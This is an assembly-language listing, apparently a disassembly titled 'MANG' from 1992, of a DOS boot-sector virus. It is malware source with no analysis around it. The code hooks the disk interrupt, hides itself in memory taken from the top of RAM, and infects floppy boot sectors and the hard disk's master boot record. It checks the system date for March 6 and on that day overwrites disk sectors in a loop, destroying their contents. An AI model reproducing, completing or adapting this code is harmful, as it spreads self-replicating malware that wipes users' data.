
PAGE  59,132

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл								         лл
;лл			        MANG				         лл
;лл								         лл
;лл      Created:   30-Aug-92					         лл
;лл      Passes:    5	       Analysis Options on: none	         лл
;лл								         лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

data_0001e	equ	4Ch
data_0002e	equ	4Eh
main_ram_size_	equ	413h
data_0003e	equ	7C00h			;*
data_0004e	equ	7C05h			;*
data_0005e	equ	7C0Ah			;*
data_0006e	equ	7C0Ch			;*
data_0007e	equ	7
data_0008e	equ	8
data_0009e	equ	0Ah
data_0014e	equ	3BEh			;*
data_0015e	equ	7C03h			;*
data_0016e	equ	0B300h			;*
data_0017e	equ	1BEh			;*
data_0018e	equ	5000h			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

mang		proc	far

start:
		jmp	loc_0007
		cmc				; Complement carry
		add	[bx+si-61h],al
		add	cl,ds:data_0016e
		db	 2Eh, 00h,0F0h, 1Eh, 50h, 0Ah
		db	0D2h, 75h, 1Bh, 33h,0C0h, 8Eh
		db	0D8h,0F6h, 06h, 3Fh, 04h, 01h
		db	 75h, 10h, 58h, 1Fh, 9Ch, 2Eh
		db	0FFh, 1Eh, 0Ah, 00h, 9Ch,0E8h
		db	 0Bh, 00h, 9Dh,0CAh, 02h, 00h
		db	 58h, 1Fh, 2Eh,0FFh, 2Eh, 0Ah
		db	 00h
		db	 50h, 53h, 51h, 52h, 1Eh, 06h
		db	 56h, 57h, 0Eh, 1Fh, 0Eh, 07h
		db	0BEh, 04h, 00h
loc_0002:
		mov	ax,201h
		mov	bx,200h
		mov	cx,1
		xor	dx,dx			; Zero register
		pushf				; Push flags
		call	dword ptr ds:data_0009e
		jnc	loc_0003		; Jump if carry=0
		xor	ax,ax			; Zero register
		pushf				; Push flags
		call	dword ptr ds:data_0009e
		dec	si
		jnz	loc_0002		; Jump if not zero
		jmp	short loc_0006
loc_0003:
		xor	si,si			; Zero register
		cld				; Clear direction
		lodsw				; String [si] to ax
		cmp	ax,[bx]
		jne	loc_0004		; Jump if not equal
		lodsw				; String [si] to ax
		cmp	ax,[bx+2]
		je	loc_0006		; Jump if equal
loc_0004:
		mov	ax,301h
		mov	dh,1
		mov	cl,3
		cmp	byte ptr [bx+15h],0FDh
		je	loc_0005		; Jump if equal
		mov	cl,0Eh
loc_0005:
		mov	ds:data_0008e,cx
		pushf				; Push flags
		call	dword ptr ds:data_0009e
		jc	loc_0006		; Jump if carry Set
		mov	si,data_0014e
		mov	di,1BEh
		mov	cx,21h
		cld				; Clear direction
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		mov	ax,301h
		xor	bx,bx			; Zero register
		mov	cx,1
		xor	dx,dx			; Zero register
		pushf				; Push flags
		call	dword ptr ds:data_0009e
loc_0006:
		pop	di
		pop	si
		pop	es
		pop	ds
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
loc_0007:
		xor	ax,ax			; Zero register
		mov	ds,ax
		cli				; Disable interrupts
		mov	ss,ax
		mov	ax,7C00h
		mov	sp,ax
		sti				; Enable interrupts
		push	ds
		push	ax
		mov	ax,ds:data_0001e
		mov	ds:data_0005e,ax
		mov	ax,ds:data_0002e
		mov	ds:data_0006e,ax
		mov	ax,ds:main_ram_size_
		dec	ax
		dec	ax
		mov	ds:main_ram_size_,ax
		mov	cl,6
		shl	ax,cl			; Shift w/zeros fill
		mov	es,ax
		mov	ds:data_0004e,ax
		mov	ax,0Eh
		mov	ds:data_0001e,ax
		mov	ds:data_0002e,es
		mov	cx,1BEh
		mov	si,data_0003e
		xor	di,di			; Zero register
		cld				; Clear direction
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		jmp	dword ptr cs:data_0015e
		xor	ax,ax			; Zero register
		mov	es,ax
		int	13h			; Disk  dl=drive a  ah=func 00h
						;  reset disk, al=return status
		push	cs
		pop	ds
		mov	ax,201h
		mov	bx,data_0003e
		mov	cx,ds:data_0008e
		cmp	cx,7
		jne	loc_0008		; Jump if not equal
		mov	dx,80h
		int	13h			; Disk  dl=drive 0  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		jmp	short loc_0009
loc_0008:
		mov	cx,ds:data_0008e
		mov	dx,100h
		int	13h			; Disk  dl=drive a  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		jc	loc_0009		; Jump if carry Set
		push	cs
		pop	es
		mov	ax,201h
		mov	bx,200h
		mov	cx,1
		mov	dx,80h
		int	13h			; Disk  dl=drive 0  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		jc	loc_0009		; Jump if carry Set
		xor	si,si			; Zero register
		cld				; Clear direction
		lodsw				; String [si] to ax
		cmp	ax,[bx]
		jne	loc_0014		; Jump if not equal
		lodsw				; String [si] to ax
		cmp	ax,[bx+2]
		jne	loc_0014		; Jump if not equal
loc_0009:
		xor	cx,cx			; Zero register
		mov	ah,4
		int	1Ah			; Real time clock   ah=func 04h
						;  get date  cx=year, dx=mon/day
		cmp	dx,306h
		je	loc_0010		; Jump if equal
		retf				; Return far
loc_0010:
		xor	dx,dx			; Zero register
		mov	cx,1
loc_0011:
		mov	ax,309h
		mov	si,ds:data_0008e
		cmp	si,3
		je	loc_0012		; Jump if equal
		mov	al,0Eh
		cmp	si,0Eh
		je	loc_0012		; Jump if equal
		mov	dl,80h
		mov	byte ptr ds:data_0007e,4
		mov	al,11h
loc_0012:
		mov	bx,data_0018e
		mov	es,bx
		int	13h			; Disk  dl=drive 0  ah=func 03h
						;  write sectors from mem es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		jnc	loc_0013		; Jump if carry=0
		xor	ah,ah			; Zero register
		int	13h			; Disk  dl=drive 0  ah=func 00h
						;  reset disk, al=return status
loc_0013:
		inc	dh
		cmp	dh,ds:data_0007e
		jb	loc_0011		; Jump if below
		xor	dh,dh			; Zero register
		inc	ch
		jmp	short loc_0011
loc_0014:
		mov	cx,7
		mov	ds:data_0008e,cx
		mov	ax,301h
		mov	dx,80h
		int	13h			; Disk  dl=drive 0  ah=func 03h
						;  write sectors from mem es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		jc	loc_0009		; Jump if carry Set
		mov	si,data_0014e
		mov	di,data_0017e
		mov	cx,21h
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		mov	ax,301h
		xor	bx,bx			; Zero register
		inc	cl
		int	13h			; Disk  dl=drive 0  ah=func 03h
						;  write sectors from mem es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		jmp	short loc_0009
		db	16 dup (0)
		db	0Ah, 'Replace and press any key w'
		db	'hen ready', 0Dh, 0Ah, 0
		db	'IO      SYSMSDOS   SYS'
		db	 00h, 00h, 55h,0AAh

mang		endp

seg_a		ends



		end	start
